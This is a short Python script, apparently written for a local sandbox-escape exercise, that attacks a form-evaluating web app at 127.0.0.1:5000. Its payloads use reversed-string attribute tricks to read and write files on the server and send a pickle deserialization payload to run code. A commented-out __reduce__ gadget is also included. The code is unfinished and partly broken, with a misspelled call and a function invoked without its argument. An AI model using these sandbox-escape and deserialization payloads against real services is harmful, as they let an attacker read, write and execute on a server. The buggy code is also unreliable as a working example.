import pickle
import requests
from asd import hi
import base64

url = 'http://127.0.0.1:5000/submit_form'

# class Moses():
# 	# def __init__(self):
# 	# 	# insert the commands to execute.
# 	# 	# import os
# 	# 	# self.x = os.listdir()
# 	# 	self.x = 2

# 	def __reduce__(self):
# 		return (open, ("b",))

def send(payload):
	data = {"calculation_to_preform": payload}
	x = requests.post(url, data = data)
	print(x.text)

def generate_pickle_payload():
	return pickle.dumps(hi)

def write_file(data):
	# first write the module
	with open("asd.py", "r") as f:
		data = f.read()
	payload = 'open("/home/dolev/coding/docker/python_sandbox_exercise/asd.py", "w").__getattribute__("etirw"[::-1])({})'.format(base64.b64encode(data))
	# then send the pickle file
	

def execute_payload():
	pickle_payload = generate_pickle_payload()
	print(pickle_payload)
	payload = "pickls.loads({})()".format(pickle_payload)
	send(payload)

def turn_to_whitebox():
	payload = 'open("/home/dolev/coding/docker/python_sandbox_exercise/second_python_sandbox.py", "r").__getattribute__("daer"[::-1])()'
	send(payload)

def main():
	write_file()
	execute_payload()

main()